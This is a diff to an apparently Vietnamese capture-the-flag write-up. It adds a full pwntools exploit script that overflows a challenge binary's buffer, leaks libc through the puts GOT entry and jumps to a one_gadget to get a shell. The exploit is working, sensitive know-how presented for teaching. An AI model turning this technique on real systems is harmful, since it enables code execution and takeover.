@@ -49,7 +49,7 @@ Payload:
     
 Hiện tại đã có libc, chỉ cần tìm hàm tạo shell.
 
-### One_gadget
+## One_gadget
 <img width="420" height="484" alt="image" src="https://github.com/user-attachments/assets/bee500bf-8e2a-4f11-9bc1-b3f28a35cfe6" />
 <img width="475" height="514" alt="image" src="https://github.com/user-attachments/assets/888049cc-7afb-45e1-806f-0a3bf7675828" />
 
@@ -70,4 +70,38 @@ Payload:
     payload+=p64(one_gadget)    //one_gadget
     p.sendlineafter(b'Data:',payload)
 
+# Script python
 
+    #!/usr/bin/env python3
+    from pwn import *
+    exe = ELF("./chall_patched",checksec=False)
+    libc = ELF("./libc.so.6",checksec=False)
+    ld = ELF("./ld-2.35.so",checksec=False)
+    context.binary = exe
+    p=process(exe.path)
+    
+    pop_rax=0x0000000000401148
+    main=0x0000000000401258
+    rw_section=0x4040d8
+    
+    payload=b'A'*56
+    payload+=p64(0)
+    payload+=p64(rw_section)
+    payload+=p64(pop_rax)
+    payload+=p64(exe.got['puts']-0x2ecb)
+    payload+=p64(exe.sym['main']+29)
+    
+    p.sendlineafter(b'Data:',payload)
+    p.recvuntil(b'Thank for playing :)\n')
+    libc_leak=u64(p.recvline()[:-1]+b'\x00\x00')
+    libc.address=libc_leak-0x80e10
+    
+    one_gadget=libc.address+0xebd03
+    
+    payload=b'A'*56
+    payload+=p64(0)
+    payload+=p64(rw_section)
+    payload+=p64(one_gadget)
+    p.sendlineafter(b'Data:',payload)
+    
+    p.interactive()
